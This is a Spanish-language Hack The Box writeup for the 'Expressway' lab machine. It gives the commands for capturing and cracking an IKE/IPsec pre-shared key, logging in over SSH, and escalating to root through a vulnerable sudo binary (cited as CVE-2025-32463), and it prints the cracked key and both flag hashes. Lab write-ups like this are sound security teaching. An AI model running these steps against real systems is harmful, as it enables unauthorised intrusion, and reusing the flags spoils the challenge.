# Expressway — HTB (Writeup)

> **Autor:** Ángel de la Vega Cuevas
> **Objetivo:** Documentar el proceso de acceso y escalada de privilegios en la máquina *Expressway* (HTB/lab) para laboratorio o repositorio personal.

---

## Resumen

Se detectó un servicio **IKE/IPsec**, se recuperó la **PSK**, se ingresó por **SSH** con el usuario `ike` y se explotó una vulnerabilidad en **sudo** que permitió obtener **root**. Se obtuvieron las flags `user.txt` y `root.txt`.

---

## 1) Descubrimiento

* **IP objetivo (lab):** `10.10.11.87` / `expressway.htb`
* **Servicios detectados:** SSH (22/tcp), IKE/IPsec (VPN con PSK)

```bash
ike-scan expressway.htb
```

---

## 2) Obtener credenciales

Se capturó el handshake y se crackeó la PSK:

```bash
ike-scan -A expressway.htb --id=ike@expressway.htb -P ike.psk
psk-crack -d /usr/share/wordlists/rockyou.txt ike.psk
```

**PSK encontrada:** `freakingrockstarontheroad`

Ingreso por SSH y primera flag:

```bash
ssh ike@expressway.htb
cat user.txt
```

---

## 3) Escalada de privilegios

Revisando permisos de `sudo`:

```bash
sudo -l
ls -l /usr/local/bin/sudo
```

Se detectó un binario vulnerable. Explotación:

```bash
/usr/local/bin/sudo -h offramp.expressway.htb bash
```

Shell de root obtenida. Segunda flag:

```bash
cat /root/root.txt
```

---

## 4) Flags

| Flag | Hash |
|------|------|
| `user.txt` | `e331b0783ab8bded06324d8ff7e12f24` |
| `root.txt` | `507e5dc773fbf8a60562be31d667407f` |

---

## 5) Notas finales

* La máquina combina **VPN IKE/IPsec** con una vulnerabilidad de **sudo/NSS** (CVE-2025-32463).
* Este writeup es para laboratorios o repositorios privados, no para entornos públicos.
* Verifica siempre que cualquier PoC o script se use en un entorno controlado y autorizado.

---
Completada: https://labs.hackthebox.com/achievement/machine/1943272/736
